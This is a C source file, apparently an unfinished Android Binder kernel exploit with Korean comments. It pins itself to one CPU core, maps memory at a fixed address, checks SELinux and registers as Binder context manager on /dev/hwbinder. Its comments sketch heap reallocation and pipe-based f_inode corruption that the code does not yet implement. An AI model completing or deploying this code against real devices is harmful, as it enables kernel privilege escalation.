#define _GNU_SOURCE // sched_setaffinity()
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h> // sched_setaffinity()
#include <sys/mman.h> // mmap()
#include <unistd.h> // pipe()
#include <stdbool.h>
#include <errno.h>
#include <string.h> // strerror

#include "binder.h"
#include "node.h"

int pipes[2];
void *svcmgr_handle;

// use certain core in CPU
// cpu: cpu number
// sched_setaffinity(pid, cpusetsize, mask pointer)
bool pin_cpu(int cpu){
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if(sched_setaffinity(0, sizeof(mask), &mask) < 0){
        fprintf(stderr, "[-] sched_setaffinity() error: %s\n", strerror(errno));
        return false;
    }
    printf("[+] success to schedule in %d cpu\n", cpu);
    return true;
}

char selinux_enforcing(){
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    char enforce;
    read(fd, &enforce, 1); // 1: enforcing mode 
    close(fd);
    return enforce;
}

int main(){
    // memory mapping addr: 0x200000
    // mmap() 통해 Kernel에서 Binder IPC Data 수신 위한 공유 메모리 영역 확보
    void *map;
    if((map  = mmap(2<<20, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0)) == MAP_FAILED){
        fprintf(stderr, "[-] mmap error: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Mapped in 0x%lx\n", map);

    // 프로세스가 동일한 CPU Core에서 실행되도록 고정
    pin_cpu(0);
    
    //SELinux enforcing
    printf("[+] SELinux enforcing : %c\n", selinux_enforcing());

    // create threads (for reallocation) 
    

    // create pipe to leak pipe address & corrupt f_inode
//    pipe(&pipes[0]);

    // binder open -> Binder Driver의 File Descriptor 얻기
    // BINDER_DEVICE: /dev/hwbinder (for BINDER_TYPE_PTR)
    struct binder_state *bs = binder_open("/dev/hwbinder", 128*1024);
    if(!bs){
        fprintf(stderr, "[-] failed to open binder driver: %s\n", strerror(errno));
        return -1;
    }

    // ServiceManager 실행
    if(binder_become_context_manager(bs)){
        fprintf(stderr, "[-] Cannot become context manager: %s\n", strerror(errno));
        return -1;
    }

    void *svcmgr = BINDER_SERVICE_MANAGER;
    svcmgr_handle = svcmgr;
    binder_loop(bs, svcmgr_handle); // ServiceManager 실행이 loop에 들어감. 즉, 부팅 동안 계속 작동하게 됨

    // create binder_node


}
